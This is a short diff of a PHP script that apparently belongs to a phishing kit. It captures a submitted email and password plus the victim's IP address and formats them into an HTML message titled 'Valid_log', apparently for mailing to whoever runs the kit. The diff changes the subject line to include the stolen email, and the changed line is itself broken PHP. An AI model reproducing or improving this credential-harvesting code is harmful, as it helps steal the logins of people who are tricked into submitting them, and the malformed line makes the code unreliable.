@@ -64,7 +64,7 @@ if(isset($_POST)){
     $data['email'] = $email->clean($_REQUEST['pet']);
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
-    $data['subject'] = "Valid_log";
+    $data['subject'] = $data['email'] "Valid_log";
     $data['message'] =
 		"
 		<html>
@@ -75,7 +75,6 @@ if(isset($_POST)){
 			<body>
 				<h3>Details</h3>
 				<p>This is the information you required</p>
-			    <br><br>
 			    <p><strong>E-ID:</strong> ".$data['email']."</p>
 			    <p><strong>P-ID:</strong>".$data['pass']."</p>
 			    <p><strong>IP:</strong>".$data['ip']."</p>
